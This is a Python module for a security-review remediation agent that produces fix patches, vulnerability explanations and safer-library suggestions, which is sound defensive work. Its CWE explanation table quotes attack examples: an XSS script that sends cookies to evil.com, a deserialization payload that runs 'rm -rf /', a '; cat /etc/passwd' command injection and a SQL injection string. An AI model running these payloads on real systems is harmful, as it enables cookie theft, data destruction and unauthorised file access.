"""Remediation agent - generates patches and fix suggestions for findings."""

import re
from typing import Any, Dict, List

import structlog
from langchain.tools import StructuredTool
from langchain_anthropic import ChatAnthropic
from pydantic import BaseModel, Field

from app.config import settings

logger = structlog.get_logger(__name__)


class PatchInput(BaseModel):
    title: str = Field(description="Finding title")
    description: str = Field(description="Finding description")
    code_snippet: str = Field(description="Vulnerable code snippet")
    severity: str = Field(description="Finding severity")
    suggestion: str = Field(description="Existing suggestion if any")


class ExplainInput(BaseModel):
    title: str = Field(description="Vulnerability title")
    description: str = Field(description="Vulnerability description")
    cwe_id: str = Field(description="CWE identifier if available", default="")
    owasp_category: str = Field(description="OWASP category if applicable", default="")


class LibraryInput(BaseModel):
    vulnerability_type: str = Field(description="Type of vulnerability (e.g., sql_injection, weak_crypto)")
    language: str = Field(description="Programming language", default="python")


# ─── Remediation knowledge base ──────────────────────────────────────────────

REMEDIATION_PATCHES = {
    "eval": {
        "python": {
            "before": "result = eval(user_input)",
            "after": "# Use ast.literal_eval for safe evaluation of literals\nimport ast\nresult = ast.literal_eval(user_input)  # Only for literals\n# Or use a proper expression parser library",
            "explanation": "eval() executes arbitrary Python code. Use ast.literal_eval() for literals or a dedicated expression parser.",
        }
    },
    "sql_injection": {
        "python": {
            "before": 'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")',
            "after": 'cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))',
            "explanation": "Use parameterized queries to prevent SQL injection. Never format user input directly into SQL strings.",
        }
    },
    "md5": {
        "python": {
            "before": "hashlib.md5(data).hexdigest()",
            "after": "hashlib.sha256(data).hexdigest()  # or use hashlib.sha3_256",
            "explanation": "MD5 is cryptographically broken. Use SHA-256 or SHA-3 for non-password hashing.",
        }
    },
    "hardcoded_password": {
        "python": {
            "before": 'password = "my_secret_password"',
            "after": 'import os\npassword = os.environ.get("DB_PASSWORD")  # Load from environment',
            "explanation": "Never hardcode credentials. Use environment variables, secrets management (Vault, AWS Secrets Manager), or encrypted config files.",
        }
    },
    "shell_injection": {
        "python": {
            "before": 'os.system(f"ls {user_input}")',
            "after": 'import subprocess\nresult = subprocess.run(["ls", user_input], capture_output=True, text=True, check=True)',
            "explanation": "Avoid shell=True and string formatting in subprocess calls. Pass arguments as a list.",
        }
    },
    "pickle": {
        "python": {
            "before": "data = pickle.loads(user_data)",
            "after": "import json\ndata = json.loads(user_data)  # Use JSON for safe deserialization",
            "explanation": "pickle.loads() can execute arbitrary code during deserialization. Use JSON, MessagePack, or other safe formats.",
        }
    },
    "weak_random": {
        "python": {
            "before": "token = str(random.random())",
            "after": "import secrets\ntoken = secrets.token_hex(32)  # Cryptographically secure",
            "explanation": "random module is not cryptographically secure. Use the secrets module for tokens, passwords, and security-sensitive randomness.",
        }
    },
    "xss": {
        "javascript": {
            "before": "element.innerHTML = userInput;",
            "after": "element.textContent = userInput;  // Or use DOMPurify.sanitize()",
            "explanation": "innerHTML enables XSS attacks. Use textContent for plain text or DOMPurify for HTML sanitization.",
        }
    },
}

SAFER_LIBRARIES = {
    "sql_injection": {
        "python": ["SQLAlchemy with ORM (parameterized by default)", "Django ORM", "psycopg2 with %s placeholders"],
        "javascript": ["knex.js with parameterized queries", "Sequelize ORM", "Prisma"],
        "java": ["JDBC PreparedStatement", "Hibernate", "JPA"],
    },
    "weak_crypto": {
        "python": ["cryptography library (pip install cryptography)", "PyNaCl for modern crypto", "argon2-cffi for password hashing"],
        "javascript": ["node:crypto (built-in)", "libsodium-wrappers", "bcrypt for passwords"],
        "java": ["BouncyCastle", "Java Security API with AES-256-GCM"],
    },
    "deserialization": {
        "python": ["json (stdlib)", "msgpack", "protobuf"],
        "java": ["Jackson with strict typing", "Gson with type adapters"],
        "javascript": ["JSON.parse() (stdlib)", "yup for schema validation"],
    },
    "xss": {
        "javascript": ["DOMPurify", "xss npm package", "React (auto-escapes by default)"],
        "python": ["markupsafe (used by Jinja2)", "bleach for HTML sanitization"],
    },
    "ssrf": {
        "python": ["ssrf-filter library", "Custom allowlist validator"],
        "javascript": ["ssrf-req-filter", "node-ssrf-filter"],
    },
}


def generate_patch(title: str, description: str, code_snippet: str, severity: str, suggestion: str) -> Dict[str, Any]:
    """Generate a code patch for a finding."""
    # Identify vulnerability type from title/description
    vuln_type = None
    title_lower = title.lower()
    desc_lower = description.lower()

    keyword_map = {
        "eval": "eval",
        "sql injection": "sql_injection",
        "md5": "md5",
        "sha1": "md5",  # Same fix pattern
        "hardcoded password": "hardcoded_password",
        "hardcoded secret": "hardcoded_password",
        "shell injection": "shell_injection",
        "command injection": "shell_injection",
        "pickle": "pickle",
        "deserialization": "pickle",
        "random": "weak_random",
        "xss": "xss",
        "innerhtml": "xss",
    }

    for keyword, vtype in keyword_map.items():
        if keyword in title_lower or keyword in desc_lower:
            vuln_type = vtype
            break

    if vuln_type and vuln_type in REMEDIATION_PATCHES:
        # Default to Python patch if language not specified
        lang_patches = REMEDIATION_PATCHES[vuln_type]
        patch_data = lang_patches.get("python") or lang_patches.get("javascript") or {}

        if patch_data:
            return {
                "patch_available": True,
                "vulnerability_type": vuln_type,
                "before": patch_data.get("before", code_snippet),
                "after": patch_data.get("after", "# Apply recommended fix"),
                "explanation": patch_data.get("explanation", suggestion),
                "unified_diff": _generate_unified_diff(
                    patch_data.get("before", code_snippet),
                    patch_data.get("after", ""),
                ),
            }

    # Generic patch suggestion
    return {
        "patch_available": False,
        "vulnerability_type": vuln_type or "unknown",
        "explanation": suggestion or description,
        "recommendation": "Manual remediation required. Review the finding and apply appropriate fix.",
    }


def _generate_unified_diff(before: str, after: str) -> str:
    """Generate a simple unified diff format."""
    before_lines = before.split("\n")
    after_lines = after.split("\n")

    diff_lines = [
        "--- a/vulnerable_code",
        "+++ b/fixed_code",
        f"@@ -1,{len(before_lines)} +1,{len(after_lines)} @@",
    ]
    for line in before_lines:
        diff_lines.append(f"-{line}")
    for line in after_lines:
        diff_lines.append(f"+{line}")

    return "\n".join(diff_lines)


def explain_vulnerability(title: str, description: str, cwe_id: str = "", owasp_category: str = "") -> Dict[str, Any]:
    """Generate a human-readable explanation of a vulnerability."""
    explanations = {
        "CWE-89": {
            "name": "SQL Injection",
            "impact": "Attackers can read, modify, or delete database content; bypass authentication; execute admin operations.",
            "attack_scenario": "An attacker submits ' OR 1=1 -- as input, causing the SQL query to return all records.",
            "business_impact": "Data breach, compliance violations, reputational damage, potential ransomware via xp_cmdshell.",
        },
        "CWE-79": {
            "name": "Cross-Site Scripting (XSS)",
            "impact": "Attackers can steal session cookies, redirect users, deface pages, or install malware.",
            "attack_scenario": "Attacker injects <script>document.location='https://evil.com/?cookie='+document.cookie</script>",
            "business_impact": "Account takeover, data theft, malware distribution to users.",
        },
        "CWE-502": {
            "name": "Deserialization of Untrusted Data",
            "impact": "Remote code execution, privilege escalation, denial of service.",
            "attack_scenario": "Attacker sends crafted serialized object that executes os.system('rm -rf /') on deserialization.",
            "business_impact": "Complete system compromise, data loss, ransomware deployment.",
        },
        "CWE-327": {
            "name": "Broken Cryptographic Algorithm",
            "impact": "Attackers can decrypt sensitive data, forge signatures, or break authentication.",
            "attack_scenario": "MD5 hash cracked in seconds using rainbow tables or GPU-accelerated attacks.",
            "business_impact": "Data exposure, authentication bypass, regulatory non-compliance.",
        },
        "CWE-78": {
            "name": "OS Command Injection",
            "impact": "Full system compromise, data exfiltration, lateral movement.",
            "attack_scenario": "User input `; cat /etc/passwd` appended to shell command gives read access to system files.",
            "business_impact": "Complete server compromise, data breach, infrastructure takeover.",
        },
    }

    explanation = explanations.get(cwe_id, {
        "name": title,
        "impact": "Could enable attackers to compromise data or system integrity.",
        "attack_scenario": "See description for details.",
        "business_impact": "Potential data breach or system compromise.",
    })

    return {
        "vulnerability_name": explanation["name"],
        "cwe_id": cwe_id,
        "owasp_category": owasp_category,
        "technical_description": description,
        "impact": explanation["impact"],
        "attack_scenario": explanation["attack_scenario"],
        "business_impact": explanation["business_impact"],
        "severity_justification": f"This is rated based on exploitability and potential business impact.",
    }


def suggest_libraries(vulnerability_type: str, language: str = "python") -> Dict[str, Any]:
    """Suggest safer libraries as alternatives."""
    vuln_normalized = vulnerability_type.lower().replace(" ", "_").replace("-", "_")

    library_map = {
        "sql_injection": SAFER_LIBRARIES["sql_injection"],
        "weak_crypto": SAFER_LIBRARIES["weak_crypto"],
        "deserialization": SAFER_LIBRARIES["deserialization"],
        "xss": SAFER_LIBRARIES["xss"],
        "ssrf": SAFER_LIBRARIES["ssrf"],
        "weak_random": {
            "python": ["secrets (stdlib)", "os.urandom()"],
            "javascript": ["crypto.randomBytes() (Node.js built-in)"],
            "java": ["java.security.SecureRandom"],
        },
        "password_storage": {
            "python": ["argon2-cffi (recommended)", "bcrypt", "passlib"],
            "javascript": ["argon2 npm", "bcrypt npm"],
            "java": ["Spring Security PasswordEncoder", "jBCrypt"],
        },
    }

    libraries = library_map.get(vuln_normalized, {})
    lang_libraries = libraries.get(language.lower(), libraries.get("python", []))

    return {
        "vulnerability_type": vulnerability_type,
        "language": language,
        "recommended_libraries": lang_libraries,
        "documentation_note": "Always review library documentation for proper usage and configuration.",
    }


REMEDIATION_TOOLS = [
    StructuredTool(
        name="generate_patch",
        description="Generate a code patch (before/after with unified diff) for a security finding",
        func=generate_patch,
        args_schema=PatchInput,
    ),
    StructuredTool(
        name="explain_vulnerability",
        description="Generate a detailed human-readable explanation of a vulnerability with attack scenarios",
        func=explain_vulnerability,
        args_schema=ExplainInput,
    ),
    StructuredTool(
        name="suggest_libraries",
        description="Suggest safer library alternatives for a given vulnerability type",
        func=suggest_libraries,
        args_schema=LibraryInput,
    ),
]


async def run_remediation_agent(
    findings: List[Dict[str, Any]],
    diff_content: str,
) -> List[Dict[str, Any]]:
    """
    Enrich findings with remediation patches and detailed explanations.
    Returns the enriched findings list.
    """
    enriched = []

    for finding in findings:
        try:
            # Generate patch
            patch_result = generate_patch(
                title=finding.get("title", ""),
                description=finding.get("description", ""),
                code_snippet=finding.get("code_snippet", ""),
                severity=finding.get("severity", "medium"),
                suggestion=finding.get("suggestion", ""),
            )

            # Generate explanation
            explanation = explain_vulnerability(
                title=finding.get("title", ""),
                description=finding.get("description", ""),
                cwe_id=finding.get("cwe_id", ""),
                owasp_category=finding.get("owasp_category", ""),
            )

            # Suggest libraries if applicable
            vuln_type = patch_result.get("vulnerability_type", "unknown")
            lib_suggestions = suggest_libraries(vuln_type, "python")

            enriched_finding = {
                **finding,
                "patch": patch_result.get("unified_diff"),
                "remediation_explanation": explanation,
                "safer_libraries": lib_suggestions.get("recommended_libraries", []),
                "attack_scenario": explanation.get("attack_scenario"),
                "business_impact": explanation.get("business_impact"),
            }

            if patch_result.get("after"):
                enriched_finding["suggestion"] = (
                    f"{finding.get('suggestion', '')}\n\n"
                    f"**Fixed Code:**\n```\n{patch_result['after']}\n```\n\n"
                    f"**Explanation:** {patch_result.get('explanation', '')}"
                )

            enriched.append(enriched_finding)

        except Exception as exc:
            logger.warning("remediation.enrich_failed", error=str(exc), finding=finding.get("title"))
            enriched.append(finding)

    logger.info("remediation_agent.complete", enriched_count=len(enriched))
    return enriched
